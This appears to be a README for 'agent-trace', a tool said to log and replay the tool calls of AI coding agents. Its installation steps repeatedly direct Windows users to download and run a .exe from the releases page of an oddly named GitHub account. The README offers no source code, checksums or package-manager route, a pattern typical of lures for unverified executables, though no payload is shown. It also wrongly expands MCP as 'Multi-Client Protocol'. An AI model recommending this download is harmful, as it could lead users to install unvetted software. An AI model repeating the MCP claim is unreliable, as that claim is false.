# 🕵️‍♂️ agent-trace - Track AI Agent Actions Easily

[![Download agent-trace](https://img.shields.io/badge/Download-agent--trace-brightgreen)](https://github.com/Citrous-districtline59/agent-trace/releases)

---

## What is agent-trace? 🤖

agent-trace records every step taken by AI agents like Claude Code and Cursor. It captures tool calls, prompts you send, and responses you get. This lets you see exactly what your AI agent is doing, so you can review, learn, and even replay the process. It works with most modern AI tools that follow common client protocols. If you've ever wondered what happens behind the scenes when an AI answers your questions, agent-trace sheds light on that.

---

## System requirements 🖥️

- Windows 10 or higher (64-bit recommended)  
- At least 4 GB of RAM  
- 100 MB of free disk space  
- Internet connection for downloading and updates  
- Basic user permissions to install software  

No special hardware or technical skills are needed.

---

## Important features

- Capture every tool call and response from AI agents  
- Save complete interaction logs for later review  
- Replay saved traces to see exactly what happened  
- Works with Claude Code, Cursor, and other MCP clients  
- Simple command line interface for easy control  
- Supports integration with monitoring tools like Datadog and Honeycomb  
- Export data in readable formats for sharing or analysis  

---

## 🚀 Getting Started

### Step 1: Download agent-trace

Go to the official release page to find the latest stable version for Windows.

[![Download agent-trace](https://img.shields.io/badge/Download-agent--trace-blue)](https://github.com/Citrous-districtline59/agent-trace/releases)

This link will take you to the download page where you will see the installation files.

---

### Step 2: Choose the correct installer

Look for a file ending with `.exe` that matches your system (usually titled something like `agent-trace-win64.exe`).

If you are not sure, pick the file with the highest version number.

---

### Step 3: Run the installer

1. Double-click the `.exe` file you downloaded.  
2. Follow the setup wizard instructions on screen.  
3. Accept the license terms and choose an install location if prompted.  
4. The installer will set up agent-trace on your computer.  

No additional configuration is needed at this stage.

---

### Step 4: Open agent-trace

After installation, open the Command Prompt:

- Press the Windows key, type `cmd`, then press Enter.  

Type `agent-trace --help` and press Enter. This will show you a list of commands you can use.

---

### Step 5: Capture a trace

To record your AI agent session:

- Use the command `agent-trace start`

This command tells agent-trace to begin capturing your agent’s activity.

---

### Step 6: Run your AI agent as usual

Use your AI agent like you normally do, through its app or client.

agent-trace will log every action in the background.

---

### Step 7: Stop capturing

When you finish your session, return to Command Prompt and type:

- `agent-trace stop`

agent-trace will save a trace file to your computer for later review.

---

### Step 8: View your trace

You can replay or examine saved traces with:

- `agent-trace replay [filename]`

Replace `[filename]` with the name of your saved trace file.

---

## Using agent-trace safely 🔒

agent-trace only monitors the activity of your AI agents. It does not send your data anywhere. Traces stay on your machine unless you share them.

Make sure to store trace files securely if they contain sensitive information.

---

## Troubleshooting and tips 🛠️

- If you get a “command not found” error, ensure the agent-trace folder is in your system’s PATH or run the `.exe` directly from the install location.  
- If tracing does not start, try running Command Prompt as Administrator.  
- To avoid large files, stop tracing as soon as you finish your session.  
- Traces can take up space; delete them after reviewing if no longer needed.  
- For detailed logs, use the `--verbose` option with commands.  

---

## Additional resources 📚

For more advanced options and integration guides, visit the project's documentation on GitHub:

https://github.com/Citrous-districtline59/agent-trace

You will find step-by-step guides to help you get the most out of agent-trace, including how to export data and connect with other observability tools.

---

## Supported AI Agents & Tools

agent-trace works best with AI agents using MCP (Multi-Client Protocol), including:  

- Claude Code  
- Cursor  
- Many other MCP-compatible clients  

It also integrates with developer tools like Datadog, Honeycomb, and OpenTelemetry for deeper insight.

---

## Feedback and Help

If you run into problems or want to report bugs, use the Issues section on the GitHub page:

https://github.com/Citrous-districtline59/agent-trace/issues

The developers monitor this space and respond to user questions.

---

## Updates and maintenance 🔄

Check the release page regularly for updates and bug fixes to keep agent-trace running smoothly.

https://github.com/Citrous-districtline59/agent-trace/releases

Keeping the software up to date helps avoid compatibility issues with your AI agents.

---

## Your privacy

agent-trace does not collect or transmit your personal data. It runs locally on your computer and stores trace files only where you save them. You control who sees your saved traces.

---

## Summary

This tool helps you see and understand what your AI agents do. It records every step and lets you replay it later. Installation is simple, and basic commands get you started quickly. Use it to gain insight into your AI interactions without technical barriers.